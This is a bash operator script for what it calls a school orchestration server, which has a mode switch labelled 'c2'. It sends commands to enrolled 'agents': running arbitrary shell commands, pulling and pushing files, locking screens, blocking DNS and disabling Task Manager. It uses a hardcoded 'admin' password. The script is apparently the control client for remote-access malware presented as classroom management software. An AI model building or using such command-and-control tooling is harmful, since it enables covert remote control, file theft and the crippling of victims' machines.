#!/bin/bash
# School Orchestration Protocol Helper Script

SERVER="http://127.0.0.1:8080"
PASSWORD="admin"

function usage() {
    echo "Usage: $0 <command> <agent_id> [args...]"
    echo ""
    echo "Commands:"
    echo "  mode                    - Show current server mode"
    echo "  set-mode <school|c2>    - Switch server mode"
    echo "  agents                  - List all agents"
    echo "  quiz <agent_id> <url>   - Activate quiz mode"
    echo "  block-dns <agent_id>    - Block all DNS"
    echo "  whitelist <agent_id> <domains...> - Whitelist domains"
    echo "  lock <agent_id>         - Lock screen"
    echo "  disable-taskmgr <agent_id> - Disable Task Manager"
    echo "  enable-taskmgr <agent_id>  - Enable Task Manager"
    echo "  revert <agent_id>       - Revert all changes"
    echo "  get-file <agent_id> <path> - Get file from agent"
    echo "  upload-file <agent_id> <local_path> <remote_path> - Upload file"
    echo "  cmd <agent_id> <command> - Execute shell command"
    echo ""
    exit 1
}

function check_curl() {
    if ! command -v curl &> /dev/null; then
        echo "Error: curl is required but not installed"
        exit 1
    fi
}

function api_call() {
    local method=$1
    local endpoint=$2
    local data=$3
    
    if [ -z "$data" ]; then
        curl -s -X "$method" "${SERVER}${endpoint}"
    else
        curl -s -X "$method" "${SERVER}${endpoint}" \
            -H "Content-Type: application/json" \
            -d "$data"
    fi
}

function get_mode() {
    api_call GET /mode | jq .
}

function set_mode() {
    local mode=$1
    local school_mode="false"
    
    if [ "$mode" = "school" ]; then
        school_mode="true"
    fi
    
    api_call POST /set_mode "{\"password\":\"$PASSWORD\",\"school_mode\":$school_mode}" | jq .
}

function list_agents() {
    api_call GET /agents | jq .
}

function quiz_mode() {
    local agent_id=$1
    local url=$2
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:QUIZ_MODE|$url\"
    }" | jq .
}

function block_dns() {
    local agent_id=$1
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:BLOCK_DNS\"
    }" | jq .
}

function whitelist_dns() {
    local agent_id=$1
    shift
    local domains="$*"
    local command="PROTOCOL:BLOCK_DNS_WHITELIST"
    
    for domain in $domains; do
        command="$command|$domain"
    done
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"$command\"
    }" | jq .
}

function lock_screen() {
    local agent_id=$1
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:LOCK_SCREEN\"
    }" | jq .
}

function disable_taskmgr() {
    local agent_id=$1
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:DISABLE_TASK_MANAGER\"
    }" | jq .
}

function enable_taskmgr() {
    local agent_id=$1
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:ENABLE_TASK_MANAGER\"
    }" | jq .
}

function revert_all() {
    local agent_id=$1
    
    api_call POST /revert_all "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\"
    }" | jq .
}

function get_file() {
    local agent_id=$1
    local path=$2
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:GET_FILE|$path\"
    }" | jq .
}

function upload_file() {
    local agent_id=$1
    local local_path=$2
    local remote_path=$3
    
    if [ ! -f "$local_path" ]; then
        echo "Error: File not found: $local_path"
        exit 1
    fi
    
    local content=$(base64 -w 0 "$local_path")
    
    api_call POST /protocol "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"PROTOCOL:UPLOAD_FILE|$remote_path|$content\"
    }" | jq .
}

function execute_cmd() {
    local agent_id=$1
    local command=$2
    
    api_call POST /add_task "{
        \"password\":\"$PASSWORD\",
        \"agent_id\":\"$agent_id\",
        \"command\":\"$command\"
    }" | jq .
}

check_curl

case "$1" in
    mode)
        get_mode
        ;;
    set-mode)
        [ -z "$2" ] && usage
        set_mode "$2"
        ;;
    agents)
        list_agents
        ;;
    quiz)
        [ -z "$2" ] || [ -z "$3" ] && usage
        quiz_mode "$2" "$3"
        ;;
    block-dns)
        [ -z "$2" ] && usage
        block_dns "$2"
        ;;
    whitelist)
        [ -z "$2" ] || [ -z "$3" ] && usage
        whitelist_dns "$@"
        ;;
    lock)
        [ -z "$2" ] && usage
        lock_screen "$2"
        ;;
    disable-taskmgr)
        [ -z "$2" ] && usage
        disable_taskmgr "$2"
        ;;
    enable-taskmgr)
        [ -z "$2" ] && usage
        enable_taskmgr "$2"
        ;;
    revert)
        [ -z "$2" ] && usage
        revert_all "$2"
        ;;
    get-file)
        [ -z "$2" ] || [ -z "$3" ] && usage
        get_file "$2" "$3"
        ;;
    upload-file)
        [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ] && usage
        upload_file "$2" "$3" "$4"
        ;;
    cmd)
        [ -z "$2" ] || [ -z "$3" ] && usage
        execute_cmd "$2" "$3"
        ;;
    *)
        usage
        ;;
esac
